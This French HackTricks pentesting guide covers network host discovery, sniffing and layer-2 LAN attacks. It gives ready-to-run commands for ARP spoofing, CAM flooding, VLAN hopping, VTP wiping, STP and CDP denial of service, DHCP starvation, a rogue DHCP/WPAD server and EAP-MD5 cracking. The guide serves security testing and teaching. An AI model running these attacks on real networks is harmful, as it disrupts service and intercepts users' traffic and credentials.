# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## Discovering hosts from the outside

Ceci va être une **brève section** sur comment trouver les **IPs répondant** depuis l'**Internet**.\
Dans cette situation vous avez un **périmètre d'IPs** (peut-être même plusieurs **plages**) et vous devez juste trouver **quelles IPs répondent**.

### ICMP

C'est la façon **la plus simple** et **la plus rapide** de découvrir si un hôte est en ligne ou non.\
Vous pouvez essayer d'envoyer des paquets **ICMP** et **attendre des réponses**. La méthode la plus simple est d'envoyer une **echo request** et d'attendre la réponse. Vous pouvez le faire en utilisant un simple `ping` ou en utilisant `fping` pour des **plages**.\
Vous pouvez aussi utiliser **nmap** pour envoyer d'autres types de paquets ICMP (cela évitera les filtres sur les requêtes/réponses ICMP echo courantes).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Il est très courant de constater que toutes sortes de paquets ICMP sont filtrés. Dans ce cas, tout ce que vous pouvez faire pour vérifier si un hôte est en ligne est **essayer de trouver des ports ouverts**. Chaque hôte a **65535 ports**, donc, si vous avez un "big" scope vous **ne pouvez pas** tester si **chaque port** de chaque hôte est ouvert ou non, cela prendra trop de temps.\
Alors, ce dont vous avez besoin est un **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) et une liste des **ports les plus utilisés:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Vous pouvez aussi effectuer cette étape avec `nmap`, mais il est plus lent et a parfois des problèmes pour identifier les hosts up.

### HTTP Port Discovery

Il s'agit simplement d'une découverte de ports TCP utile lorsque vous voulez **vous concentrer sur la découverte des services HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Découverte de ports UDP

Vous pouvez aussi essayer de vérifier s'il existe un **port UDP ouvert** pour décider si vous devez **porter plus d'attention** à un **hôte.** Comme les services UDP **ne répondent généralement pas** avec **aucune donnée** à une sonde UDP vide classique, il est difficile de dire si un port est filtré ou ouvert. La manière la plus simple de trancher est d'envoyer un paquet lié au service en cours d'exécution, et comme vous ne savez pas quel service tourne, vous devriez essayer le plus probable en vous basant sur le numéro de port :
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La ligne nmap proposée précédemment testera les **top 1000 UDP ports** sur chaque hôte de la plage **/24**, mais même cela prendra **>20min**. Si vous avez besoin de **résultats plus rapides**, vous pouvez utiliser [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Cela enverra ces **UDP probes** vers leur **port attendu** (pour une plage /24 cela prendra seulement 1 min) : _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Découverte de ports SCTP
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Vous trouverez ici un bon guide de toutes les attaques Wifi bien connues au moment de la rédaction :

{{#ref}}
../pentesting-wifi/
{{#endref}}

## Découverte des hôtes depuis l'intérieur du réseau

Si vous êtes à l'intérieur du réseau, l'une des premières choses que vous voudrez faire est de **découvrir d'autres hôtes**. Selon **le niveau de bruit** que vous pouvez/voulez générer, différentes actions peuvent être entreprises :

### Passif

Vous pouvez utiliser ces outils pour découvrir passivement des hôtes à l'intérieur d'un réseau connecté :
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Actif

Notez que les techniques décrites dans [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) peuvent également être **appliquées ici**.\
Mais, comme vous êtes sur le **même réseau** que les autres hôtes, vous pouvez faire **plus de choses** :
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Notez que les techniques commentées dans _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) peuvent également être **appliquées ici**.\  
Mais, puisque vous êtes sur le **même réseau** que les autres hôtes, vous pouvez faire **plus de choses** :

- Si vous effectuez un **ping** sur une **adresse broadcast de sous-réseau**, le ping devrait atteindre **chaque hôte** et ils pourraient **vous répondre** : `ping -b 10.10.5.255`
- En effectuant un **ping** sur l'**adresse broadcast du réseau**, vous pourriez même trouver des hôtes dans **d'autres sous-réseaux** : `ping -b 255.255.255.255`
- Utilisez les flags `-PE`, `-PP`, `-PM` de `nmap` pour effectuer la découverte d'hôtes en envoyant respectivement **ICMPv4 echo**, **timestamp**, et **subnet mask requests** : `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan est utilisé pour **allumer** des ordinateurs via un **message réseau**. Le magic packet utilisé pour allumer l'ordinateur n'est qu'un paquet où un **MAC Dst** est fourni, puis il est **répété 16 fois** à l'intérieur du même paquet.\  
Ce type de paquets est généralement envoyé en **ethernet 0x0842** ou dans un **UDP packet** vers le port 9.\  
Si **no \[MAC]** n'est fourni, le paquet est envoyé en **broadcast ethernet** (et le broadcast MAC sera celui qui est répété).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Scan des hôtes

Une fois que vous avez découvert toutes les IPs (externes ou internes) que vous souhaitez scanner en profondeur, différentes actions peuvent être effectuées.

### TCP

- **Open** port: _SYN --> SYN/ACK --> RST_
- **Closed** port: _SYN --> RST/ACK_
- **Filtered** port: _SYN --> \[NO RESPONSE]_
- **Filtered** port: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Il y a 2 options pour scanner un port UDP :

- Envoyer un **UDP packet** et vérifier la réponse _**ICMP unreachable**_ si le port est **fermé** (dans plusieurs cas ICMP sera **filtered**, donc vous ne recevrez aucune information si le port est fermé ou ouvert).
- Envoyer des **formatted datagrams** pour obtenir une réponse d'un **service** (par ex., DNS, DHCP, TFTP, et d'autres, comme listés dans _nmap-payloads_). Si vous recevez une **réponse**, alors le port est **ouvert**.

**Nmap** va **mélanger les deux** options en utilisant "-sV" (les scans UDP sont très lents), mais notez que les scans UDP sont plus lents que les scans TCP :
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** est conçu pour être utilisé conjointement avec **TCP (Transmission Control Protocol)** et **UDP (User Datagram Protocol)**. Son objectif principal est de faciliter le transport des données téléphoniques sur les réseaux IP, reproduisant bon nombre des fonctionnalités de fiabilité présentes dans **Signaling System 7 (SS7)**. **SCTP** est un composant central de la famille de protocoles **SIGTRAN**, qui vise à transporter les signaux SS7 sur des réseaux IP.

La prise en charge de **SCTP** est assurée par divers systèmes d'exploitation, tels que **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** et **VxWorks**, ce qui indique son large adoption et son utilité dans le domaine des télécommunications et des réseaux.

Deux scans différents pour SCTP sont proposés par nmap : _-sY_ et _-sZ_.
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **Plus d'options nmap**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Révéler les adresses IP internes

**Les routers, firewalls et network devices mal configurés** répondent parfois aux network probes en utilisant des **adresses source non publiques**. **tcpdump** peut être utilisé pour identifier les paquets reçus depuis des adresses privées lors des tests. Plus précisément, sur **Kali Linux**, les paquets peuvent être capturés sur l'interface **eth2**, qui est accessible depuis le public Internet. Il est important de noter que si votre configuration est derrière un **NAT** ou un **Firewall**, ces paquets sont susceptibles d'être filtrés.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Avec Sniffing, vous pouvez obtenir des détails sur les IP ranges, les subnet sizes, les MAC addresses et les hostnames en analysant les frames et packets capturés. Si le réseau est mal configuré ou si la switching fabric est sous pression, des attaquants peuvent capter des informations sensibles via passive network sniffing.

Si un switched Ethernet network est correctement configuré, vous ne verrez que les broadcast frames et le trafic destiné à votre MAC address.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
On peut également capturer des paquets depuis une machine distante via une session SSH en utilisant Wireshark comme GUI en temps réel.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Évidemment.

### Capturing credentials

Vous pouvez utiliser des outils comme [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) pour extraire des credentials depuis un pcap ou une interface live.

## LAN attacks

### ARP spoofing

ARP Spoofing consiste à envoyer des gratuitous ARPResponses pour indiquer que l'IP d'une machine a le MAC de notre appareil. Ensuite, la victime modifiera la table ARP et contactera notre machine chaque fois qu'elle voudra joindre l'IP usurpée.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Surcharger la CAM table du switch en envoyant un grand nombre de packets avec différentes source mac address. Lorsque la CAM table est pleine, le switch commence à se comporter comme un hub (broadcasting tout le trafic).
```bash
macof -i <interface>
```
Dans les commutateurs modernes, cette vulnérabilité a été corrigée.

### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

Le **Dynamic Trunking Protocol (DTP)** est conçu comme un protocole de couche liaison pour faciliter un système automatique de trunking, permettant aux commutateurs de sélectionner automatiquement des ports en mode trunk (Trunk) ou en mode non-trunk. Le déploiement de **DTP** est souvent perçu comme le signe d'une conception réseau sous-optimale, ce qui souligne l'importance de configurer manuellement les trunks uniquement là où c'est nécessaire et de maintenir une documentation appropriée.

Par défaut, les ports des commutateurs sont configurés en mode Dynamic Auto, ce qui signifie qu'ils sont prêts à initier le trunking si un commutateur voisin le demande. Un risque de sécurité survient lorsqu'un pentester ou un attaquant se connecte au commutateur et envoie une DTP Desirable frame, contraignant le port à passer en trunk mode. Cette action permet à l'attaquant d'énumérer les VLANs via l'analyse des trames STP et de contourner la segmentation VLAN en configurant des interfaces virtuelles.

La présence de DTP par défaut sur de nombreux commutateurs peut être exploitée par des adversaires pour imiter le comportement d'un commutateur, accédant ainsi au trafic sur tous les VLANs. Le script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) est utilisé pour surveiller une interface, révélant si un commutateur est en Default, Trunk, Dynamic, Auto ou Access mode — ce dernier étant la seule configuration immunisée contre les VLAN hopping attacks. Cet outil évalue l'état de vulnérabilité du commutateur.

Si une vulnérabilité réseau est identifiée, l'outil _**Yersinia**_ peut être utilisé pour "enable trunking" via le protocole DTP, permettant d'observer les paquets de tous les VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Pour énumérer les VLANs, il est également possible de générer la trame DTP Desirable avec le script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. N**e n'interrompez pas le script en aucune circonstance. Il injecte DTP Desirable toutes les trois secondes. **Les trunk channels créés dynamiquement sur le switch ne durent que cinq minutes. Après cinq minutes, le trunk tombe.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Je tiens à souligner que **Access/Desirable (0x03)** indique que la trame DTP est de type Desirable, ce qui dit au port de passer en mode Trunk. Et **802.1Q/802.1Q (0xa5** indique le type d'encapsulation **802.1Q**.

En analysant les trames STP, **nous apprenons l'existence des VLAN 30 et VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Attaquer des VLANs spécifiques

Une fois que vous connaissez les IDs de VLAN et les valeurs d'IP, vous pouvez **configurer une interface virtuelle pour attaquer un VLAN spécifique**.\
Si DHCP n'est pas disponible, utilisez _ifconfig_ pour définir une adresse IP statique.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

L'attaque évoquée de **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** d'autres VLANs est **automatically performed** par l'outil : [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Si un attaquant connaît la valeur de la **MAC, IP and VLAN ID of the victim host**, il peut essayer de **double tag a frame** avec sa VLAN désignée et la VLAN de la victime et envoyer un paquet. Comme la **victim won't be able to connect back** avec l'attaquant, la **best option for the attacker is communicate via UDP** est de cibler des protocoles pouvant effectuer des actions intéressantes (comme SNMP).

Une autre option pour l'attaquant est de lancer un **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (probablement via Internet). Ensuite, l'attaquant pourrait sniff sur le second hôte qu'il possède si celui-ci reçoit des paquets de la victime.

![](<../../images/image (190).png>)

To perform this attack you could use scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Contournement latéral de la segmentation VLAN <a href="#d679" id="d679"></a>

Si vous avez **accès à un switch auquel vous êtes directement connecté**, vous pouvez **contourner la segmentation VLAN** au sein du réseau. Il suffit de **passer le port en mode trunk** (aussi appelé trunk), de créer des interfaces virtuelles avec les IDs des VLANs ciblés, et de configurer une adresse IP. Vous pouvez tenter de demander l'adresse dynamiquement (DHCP) ou la configurer statiquement. Cela dépend du cas.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Contournement des Private VLAN de couche 3

Dans certains environnements, comme les réseaux Wi‑Fi invités, des paramètres de **port isolation (also known as private VLAN)** sont mis en place pour empêcher les clients connectés à un access point de communiquer directement entre eux. Cependant, une technique a été identifiée qui peut contourner ces mesures d'isolation. Cette technique exploite soit l'absence de network ACLs, soit leur mauvaise configuration, permettant aux paquets IP d'être routés via un router pour atteindre un autre client sur le même réseau.

L'attaque est réalisée en créant un **paquet qui porte l'adresse IP du client destinataire mais avec l'adresse MAC du router**. Cela pousse le router à transférer par erreur le paquet vers le client cible. Cette approche est similaire à celle utilisée dans Double Tagging Attacks, où la capacité à contrôler un hôte accessible à la victime est exploitée pour tirer parti de la faille de sécurité.

Étapes clés de l'attaque :

1. **Crafting a Packet :** Un paquet est spécialement conçu pour inclure l'adresse IP du client cible mais avec l'adresse MAC du router.
2. **Exploiting Router Behavior :** Le paquet ainsi fabriqué est envoyé vers le router qui, en raison de la configuration, redirige le paquet vers le client cible, contournant l'isolation fournie par les paramètres de private VLAN.

### VTP Attacks

VTP (VLAN Trunking Protocol) centralise la gestion des VLAN. Il utilise des numéros de révision pour maintenir l'intégrité de la base de données VLAN ; toute modification incrémente ce numéro. Les switches adoptent les configurations ayant des numéros de révision plus élevés, mettant à jour leur propre base de données VLAN.

#### VTP Domain Roles

- **VTP Server :** Gère les VLAN—crée, supprime, modifie. Il diffuse des annonces VTP aux membres du domaine.
- **VTP Client :** Reçoit les annonces VTP pour synchroniser sa base de données VLAN. Ce rôle est restreint et n'autorise pas de modifications locales de la configuration VLAN.
- **VTP Transparent :** Ne participe pas aux mises à jour VTP mais fait transiter les annonces VTP. Non affecté par les attaques VTP, il conserve un numéro de révision constant égal à zéro.

#### VTP Advertisement Types

- **Summary Advertisement :** Diffusée par le VTP server toutes les 300 secondes, contenant les informations essentielles du domaine.
- **Subset Advertisement :** Envoyée après des modifications de configuration VLAN.
- **Advertisement Request :** Émise par un VTP client pour demander une Summary Advertisement, généralement en réponse à la détection d'un numéro de révision de configuration plus élevé.

Les vulnérabilités VTP sont exploitables exclusivement via des trunk ports car les annonces VTP circulent uniquement par ceux‑ci. Après des scénarios d'attaque DTP, l'attention peut se porter sur VTP. Des outils comme Yersinia peuvent faciliter les attaques VTP, visant à effacer la base de données VLAN, perturbant ainsi le réseau.

Remarque : Cette discussion concerne VTP version 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
Dans le mode graphique de Yersinia, choisissez l'option deleting all VTP vlans pour purger la base de données VLAN.

### Attaques STP

**Si vous ne pouvez pas capturer des trames BPDU sur vos interfaces, il est peu probable que vous réussissiez une attaque STP.**

#### **STP BPDU DoS**

L'envoi d'un grand nombre de BPDUs TCP (Topology Change Notification) ou Conf (les BPDUs qui sont envoyés lorsque la topologie est créée) surcharge les commutateurs et ils cessent de fonctionner correctement.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Lorsqu'un TCP est envoyé, la CAM table des switches sera supprimée au bout de 15s. Ensuite, si vous envoyez en continu ce type de packets, la CAM table sera redémarrée en continu (ou toutes les 15segs) et lorsqu'elle est redémarrée, le switch se comporte comme un hub
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

L'attaquant simule le comportement d'un switch pour devenir le STP root du réseau. Ainsi, davantage de données passeront par lui. Ceci est intéressant lorsque vous êtes connecté à deux switches différents.\
Cela se fait en envoyant des paquets BPDUs CONF indiquant que la valeur **priority** est inférieure à la priorité réelle du root switch actuel.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Si l'attacker est connecté à 2 switches, il peut devenir le root du nouvel arbre et tout le trafic entre ces switches passera par lui** (a MITM attack will be performed).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Attaques CDP

CISCO Discovery Protocol (CDP) est essentiel pour la communication entre les appareils CISCO, leur permettant de **s'identifier mutuellement et de partager des détails de configuration**.

#### Collecte de données passive <a href="#id-0e0f" id="id-0e0f"></a>

CDP est configuré pour diffuser des informations sur tous les ports, ce qui peut constituer un risque pour la sécurité. Un attaquant, en se connectant à un port de switch, peut déployer des sniffers réseau comme **Wireshark**, **tcpdump**, ou **Yersinia**. Cette action peut révéler des informations sensibles sur l'appareil réseau, y compris son modèle et la version de Cisco IOS qu'il exécute. L'attaquant pourrait alors cibler des vulnérabilités spécifiques à la version de Cisco IOS identifiée.

#### Provoquer une inondation de la table CDP <a href="#id-0d6a" id="id-0d6a"></a>

Une approche plus agressive consiste à lancer une Denial of Service (DoS) en saturant la mémoire du switch, en se faisant passer pour des équipements CISCO légitimes. Ci-dessous se trouve la séquence de commandes pour initier une telle attaque en utilisant Yersinia, un outil réseau conçu pour les tests :
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Pendant cette attaque, le CPU du switch et la table des voisins CDP sont fortement sollicités, entraînant ce qu'on appelle souvent **“paralysie du réseau”** en raison de la consommation excessive de ressources.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Vous pouvez également utiliser [**scapy**](https://github.com/secdev/scapy/). Veillez à l'installer avec le package `scapy/contrib`.

### Attaques VoIP et l'outil VoIP Hopper

Les téléphones VoIP, de plus en plus intégrés aux appareils IoT, offrent des fonctionnalités telles que déverrouiller des portes ou contrôler des thermostats via des numéros de téléphone spéciaux. Toutefois, cette intégration peut présenter des risques de sécurité.

L'outil [**voiphopper**](http://voiphopper.sourceforge.net) est conçu pour émuler un téléphone VoIP dans divers environnements (Cisco, Avaya, Nortel, Alcatel-Lucent). Il découvre l'ID VLAN du réseau vocal en utilisant des protocoles tels que CDP, DHCP, LLDP-MED et 802.1Q ARP.

**VoIP Hopper** propose trois modes pour le Cisco Discovery Protocol (CDP) :

1. **Sniff Mode** (`-c 0`) : Analyse les paquets réseau pour identifier l'ID VLAN.
2. **Spoof Mode** (`-c 1`) : Génère des paquets personnalisés mimant ceux d'un vrai appareil VoIP.
3. **Spoof with Pre-made Packet Mode** (`-c 2`) : Envoie des paquets identiques à ceux d'un modèle spécifique de téléphone IP Cisco.

Le mode privilégié pour la rapidité est le troisième. Il nécessite de spécifier :

- l'interface réseau de l'attaquant (`-i` parameter).
- le nom de l'appareil VoIP émulé (`-E` parameter), conforme au format de nommage Cisco (par exemple SEP suivi d'une adresse MAC).

En environnement d'entreprise, pour imiter un appareil VoIP existant, on peut :

- Inspecter l'étiquette MAC sur le téléphone.
- Consulter les paramètres d'affichage du téléphone pour voir les informations sur le modèle.
- Connecter l'appareil VoIP à un laptop et observer les requêtes CDP avec Wireshark.

Un exemple de commande pour exécuter l'outil en troisième mode serait :
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Attaques DHCP

#### Énumération
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Deux types de DoS** peuvent être effectués contre les serveurs DHCP.

La première consiste à **simuler suffisamment d'hôtes fictifs pour utiliser toutes les adresses IP possibles**.\
Cette attaque ne fonctionnera que si vous pouvez voir les réponses du serveur DHCP et compléter le protocole (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Par exemple, ceci **n'est pas possible dans les réseaux Wifi**.

Une autre façon d'effectuer un DHCP DoS est d'envoyer un **paquet DHCP-RELEASE en utilisant comme adresse source chaque IP possible**. Ensuite, le serveur pensera que tout le monde a fini d'utiliser l'adresse IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Une façon plus automatique de faire cela est d'utiliser l'outil [DHCPing](https://github.com/kamorin/DHCPig)

Vous pouvez utiliser les DoS mentionnés pour forcer les clients à obtenir de nouveaux baux dans l'environnement, et épuiser les serveurs légitimes afin qu'ils deviennent non réactifs. Donc, lorsque les serveurs légitimes essaieront de se reconnecter, **vous pourrez fournir des valeurs malveillantes mentionnées dans l'attaque suivante**.

#### Définir des valeurs malveillantes

Un serveur DHCP malveillant peut être configuré en utilisant le script DHCP situé à `/usr/share/responder/DHCP.py`. Ceci est utile pour des attaques réseau, comme la capture du trafic HTTP et des identifiants, en redirigeant le trafic vers un serveur malveillant. Cependant, configurer une passerelle rogue est moins efficace car cela ne permet de capturer que le trafic sortant du client, manquant les réponses de la véritable passerelle. Il est donc recommandé de mettre en place un serveur DNS ou WPAD malveillant pour une attaque plus efficace.

Below are the command options for configuring the rogue DHCP server:

- **Notre adresse IP (Annonce de la passerelle)**: Use `-i 10.0.0.100` to advertise your machine's IP as the gateway.
- **Nom de domaine DNS local**: Optionnellement, utilisez `-d example.org` pour définir un nom de domaine DNS local.
- **IP du routeur/passerelle d'origine**: Use `-r 10.0.0.1` to specify the IP address of the legitimate router or gateway.
- **IP du serveur DNS primaire**: Use `-p 10.0.0.100` to set the IP address of the rogue DNS server you control.
- **IP du serveur DNS secondaire**: Optionnellement, utilisez `-s 10.0.0.1` pour définir une IP de serveur DNS secondaire.
- **Masque réseau local**: Use `-n 255.255.255.0` to define the netmask for the local network.
- **Interface pour le trafic DHCP**: Use `-I eth1` to listen for DHCP traffic on a specific network interface.
- **Adresse de configuration WPAD**: Use `-w “http://10.0.0.100/wpad.dat”` to set the address for WPAD configuration, assisting in web traffic interception.
- **Usurper l'IP de la passerelle par défaut**: Include `-S` to spoof the default gateway IP address.
- **Répondre à toutes les requêtes DHCP**: Include `-R` to make the server respond to all DHCP requests, but be aware that this is noisy and can be detected.

En utilisant correctement ces options, un serveur DHCP malveillant peut être mis en place pour intercepter efficacement le trafic réseau.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP Attaques**

Voici quelques tactiques d'attaque qui peuvent être utilisées contre les implémentations 802.1X :

- Brute-force actif de mots de passe via EAP
- Attaquer le serveur RADIUS avec du contenu EAP malformé _\*\*_(exploits)
- Capture des messages EAP et craquage hors-ligne de mots de passe (EAP-MD5 et PEAP)
- Forcer l'authentification EAP-MD5 pour contourner la validation des certificats TLS
- Injection de trafic réseau malveillant lors de l'authentification en utilisant un hub ou équivalent

Si l'attaquant se trouve entre la victime et le serveur d'authentification, il pourrait essayer de dégrader (si nécessaire) le protocole d'authentification en EAP-MD5 et capturer la tentative d'authentification. Ensuite, il pourrait la brute-force en utilisant:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
